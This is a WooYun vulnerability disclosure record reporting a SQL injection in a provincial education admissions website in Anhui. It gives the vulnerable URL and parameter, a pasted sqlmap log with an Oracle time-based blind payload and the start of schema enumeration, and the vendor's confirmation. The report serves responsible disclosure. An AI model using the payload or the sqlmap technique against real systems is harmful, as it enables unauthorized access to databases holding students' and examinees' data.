wybug_title: 某省教育招生考试院存在SQL注入
wybug_corp: 安徽省教育厅信息中心
wybug_detail:
漏洞详情 披露状态：   									2015-12-16：	细节已通知厂商并且等待厂商处理中									2015-12-20：	厂商已经确认，细节仅向厂商公开									2015-12-30：	细节向核心白帽子及相关领域专家公开									2016-01-09：	细节向普通白帽子公开									2016-01-19：	细节向实习白帽子公开									2016-02-01：	细节向公众公开  简要描述： 妈妈说  不能黑产 详细说明：  
http://www.ahzsks.cn/Non-Degree7/article.jsp?articleId=164758779
参数articleId存在注入   漏洞证明：      sqlmap/1.0-dev - automatic SQL injection and database takeover tool    http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicablelocal, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 18:55:48[18:55:48] [INFO] fetched random HTTP User-Agent header from file 'C:\Python27\sqlmap\txt\user-agents.txt': Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.18.1 (KHTML, like Gecko) Version/5.0 Safari/533.16[18:55:48] [INFO] resuming back-end DBMS 'oracle'[18:55:48] [INFO] testing connection to the target url[18:55:48] [INFO] heuristics detected web page charset 'ISO-8859-2'sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: articleId    Type: AND/OR time-based blind    Title: Oracle AND time-based blind    Payload: articleId=164758779 AND 9594=DBMS_PIPE.RECEIVE_MESSAGE(CHR(114)||CHR(98)||CHR(67)||CHR(68),5)---[18:55:48] [INFO] the back-end DBMS is Oracleweb application technology: Nginx, JSPback-end DBMS: Oracle[18:55:48] [WARNING] schema names are going to be used on Oracle for enumeration as the counterpart to database names on other DBMSes[18:55:48] [INFO] fetching database (schema) names[18:55:48] [INFO] fetching number of databases[18:55:48] [WARNING] time-based comparison needs larger statistical model. Making a few dummy requests, please wait..[18:55:50] [WARNING] it is very important not to stress the network adapter's bandwidth during usage of time-based queriesdo you want sqlmap to try to optimize value(s) for DBMS delay responses (option'--time-sec')? [Y/n] y1[18:56:11] [INFO] adjusting time delay to 2 seconds due to good response times7[18:56:12] [INFO] retrieved: CTXSYS[18:57:07] [INFO] retrieved: DBS[18:57:37] [ERROR] invalid character detected. retrying..[18:57:37] [WARNING] increasing time delay to 3 secondsNMP[18:58:22] [INFO] retrieved: DMSYS[18:59:19] [INFO] retrieved: EXFSYS[19:00:30] [INFO] retrieved: E//还在跑库名就提交了   修复方案：  我是不是好孩子？   版权声明：转载请注明来源 路人毛@乌云
wybug_reply: 漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2015-12-20 18:38 厂商回复： 开发商暂未回复 最新状态： 2015-12-21：开发商已确认，正在进行修复
